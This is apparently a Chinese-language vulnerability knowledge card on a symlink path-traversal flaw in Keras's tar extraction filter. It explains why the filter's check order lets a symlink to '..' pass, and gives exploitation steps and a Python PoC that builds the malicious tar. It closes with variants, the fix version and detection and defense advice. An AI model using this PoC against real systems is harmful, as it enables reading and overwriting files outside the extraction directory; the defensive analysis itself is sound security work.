---
id: web-generic-file-upload-keras-tar-filter-symlink-check-order-bypass
title: Keras get_file tar 解压 filter_safe_paths 检查顺序缺陷：符号链接条目绕过过滤逃逸解压目录
type: scenario
domain: web
path: web/generic/file-upload
technique: archive-filter-symlink-check-order-bypass
tags:
- web
- file-upload
- archive
- tar
- symlink
- path-traversal
- filter-bypass
- keras
- python
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: 3.11.3
verification:
  verified_by: verifier-V163
  verified_at: '2026-11-06T13:39:33+08:00'
  notes: 已对照原文与 4 张图核对：filter_safe_paths 先 name 后 linkname 的 elif 顺序缺陷、subdir/link_to_parent->.. 被创建并经链接列出父目录（图 04）；huntr 图标注受影响 3.11.3/修复 3.13.0，原文实测环境 3.11.2；未演示具体敏感文件读写，卡内已如实标注；与 91112 卡机制不同（检查顺序缺陷 vs PATH_MAX 超长链），可并存
url: /docs/web/generic/file-upload/web-generic-file-upload-keras-tar-filter-symlink-check-order-bypass/
draft: false
kb_aliases:
- Keras 目录穿越
- filter_safe_paths 绕过
- filter_safe_tarinfos
- tar 解压符号链接逃逸
- 符号链接过滤器检查顺序
- get_file extract 目录穿越
---

## 一句话结论

Keras（受影响版本原文标记 3.11.3，修复于 3.13.0）在 `keras.utils.get_file(..., extract=True)` 解压 tar 时调用自定义过滤器 `filter_safe_paths()`，该过滤器先判断条目路径名是否在基目录内，只有路径名不安全时才进入符号链接目标检查；攻击者构造“路径名安全、linkname 指向 `..`”的软链接条目即可通过检查，解压后得到一个逃逸出解压目录的符号链接，后续经该链接可读取/写入解压目录之外的文件。

## 原理

- 入口：`keras/src/utils/file_utils.py` 的 `get_file()` 在 `extract=True` 时调用 `extract_archive(download_target, path)`；tar 分支执行 `archive.extractall(path, members=filter_safe_paths(archive))`。
- 过滤器逻辑（受影响版本）：
  ```python
  def is_path_in_dir(path, base_dir):
      return resolve_path(os.path.join(base_dir, path)).startswith(base_dir)

  def is_link_in_dir(info, base):
      tip = resolve_path(os.path.join(base, os.path.dirname(info.name)))
      return is_path_in_dir(info.linkname, base_dir=tip)

  def filter_safe_paths(members):
      base_dir = resolve_path(".")
      for finfo in members:
          valid_path = False
          if is_path_in_dir(finfo.name, base_dir):
              valid_path = True
              yield finfo          # 只校验了 name，未校验 linkname
          elif finfo.issym() or finfo.islnk():
              if is_link_in_dir(finfo, base_dir):
                  valid_path = True
                  yield finfo
  ```
- **为什么成立**：
  1. `if is_path_in_dir(finfo.name, base_dir)` 对符号链接条目同样成立（`name` 是链接自身的路径，通常位于解压目录内），于是直接 `yield`，`elif` 中针对 `linkname` 的 `is_link_in_dir()` 永远不会执行；`..`、绝对路径等任意链接目标都被放行。
  2. 即使走到 `is_link_in_dir()`，`resolve_path()` 是 `os.path.realpath(os.path.abspath(path))`；检查时链接尚未创建、目标路径不存在，`realpath` 不会解析未来的链接，只做词法规范化，因此对“名字安全、目标逃逸”的条目仍有绕过空间。
  3. `base_dir = resolve_path(".")` 取的是进程当前目录而非 `extractall(path, ...)` 的解压目标目录，校验基准与实际落盘目录不一致，进一步放大了逃逸范围。
- 解压后文件系统层面链接真实存在；任何跟随该路径的读取（静态目录展示、文件遍历、模型加载）都会解析到解压目录之外，等价于目录穿越。若同一归档中还包含 `subdir/link_to_parent/evil` 这类经链接的条目，解压写入也会落到链接目标。

## 触发条件

- 应用使用 Keras（受影响版本）的 `get_file(..., extract=True)` 或同款 `filter_safe_paths` 逻辑解压 tar。
- 攻击者能控制被下载归档的来源（用户可控的模型/数据集 URL、被投毒的上游仓库、可上传后由服务端下载解压的归档）。
- 解压目录之外的目标路径对服务进程可读/可写；读取敏感文件还需要应用或后续逻辑访问该软链接路径。

## 利用步骤

1. 构造恶意 tar：创建目录 `subdir`，在其中放符号链接 `link_to_parent -> ..`，可再加入 `escape -> ../../..` 等更深逃逸链接。
2. 让目标通过 `get_file()` 下载并解压该 tar（`extract=True`）。
3. `filter_safe_paths()` 只看到 `subdir/link_to_parent` 在基目录内即放行，软链接被创建。
4. 访问/读取 `subdir/link_to_parent/<file>` 即读到解压目录父目录中的文件；若继续解压经该链接的条目，可写到解压目录之外。

## PoC

```python
import io, tarfile

with tarfile.open("exploit.tar.gz", "w:gz") as tar:
    d = tarfile.TarInfo("subdir"); d.type = tarfile.DIRTYPE; tar.addfile(d)
    link = tarfile.TarInfo("subdir/link_to_parent")
    link.type = tarfile.SYMTYPE
    link.linkname = ".."                      # 目标逃逸，但 name 在解压目录内
    tar.addfile(link)
    f = tarfile.TarInfo("subdir/normal.txt"); f.type = tarfile.REGTYPE; f.size = 5
    tar.addfile(f, io.BytesIO(b"hello"))
```

```python
# 受影响版本等价逻辑
import os, warnings, tarfile

def resolve_path(p): return os.path.realpath(os.path.abspath(p))
def is_path_in_dir(p, base): return resolve_path(os.path.join(base, p)).startswith(base)
def is_link_in_dir(info, base):
    tip = resolve_path(os.path.join(base, os.path.dirname(info.name)))
    return is_path_in_dir(info.linkname, base_dir=tip)

def filter_safe_paths(members):
    base = resolve_path(".")
    for fi in members:
        ok = False
        if is_path_in_dir(fi.name, base):
            ok = True; yield fi
        elif fi.issym() or fi.islnk():
            if is_link_in_dir(fi, base):
                ok = True; yield fi
        if not ok: warnings.warn("Skipping")

with tarfile.open("exploit.tar.gz") as a:
    a.extractall("cache_dir", members=filter_safe_paths(a))
# 结果：cache_dir/subdir/link_to_parent -> .. 被创建
```

验证：`ls cache_dir/subdir/link_to_parent/` 列出的是解压目录父目录内容；`readlink cache_dir/subdir/link_to_parent` 为 `..`。

## 变体与关联

- 逃逸深度可调：`linkname` 用多层 `../..` 或绝对路径，绕过可能存在的浅层校验。
- 同名/顺序组合：先放软链接条目、再放经链接的普通文件条目，若解压器按顺序处理，文件会写到链接目标（原文未实测写入，属于延伸利用）。
- 关联本库：[[web-generic-file-upload-archive-symlink-extract-read-write]]（通用压缩包软链接读写）、[[ai-security-agent-security-file-read-tool-symlink-realpath-bypass]]（normpath/realpath 边界检查被软链接绕过）；本卡的差异点是“过滤器自身检查顺序错误 + realpath 对不存在路径不解析”，属于过滤器设计缺陷而非单纯未禁止 symlink。
- 修复：Keras 3.13.0 将符号链接检查提前到普通路径检查之前（`filter_safe_tarinfos`），并在 Python 3.12–3.13 上叠加 `filter="data"`。

## 检测与防御

- 解压前遍历所有条目，对 `issym()`/`islnk()` 一律拒绝或校验 `linkname` 解析后的真实路径必须位于解压目录内（用基于已存在目录的 `realpath`，并考虑“检查时不存在”的时序）。
- 不用自定义过滤器替代标准安全过滤器：Python 3.12+ 使用 `tarfile.extractall(..., filter="data")`，3.14 起为默认。
- 解压到隔离目录，且该目录不包含可被跟随访问的父目录敏感文件；对解压结果做二次扫描，发现指向目录外的链接立即删除。
- 检测：归档中出现符号链接/硬链接条目；解压目录出现 `readlink` 指向 `..` 或绝对路径的链接；应用读取解压目录时出现越界路径访问日志。
- 升级 Keras 到 3.13.0 及以上，确认使用 `filter_safe_tarinfos` 且符号链接检查优先。
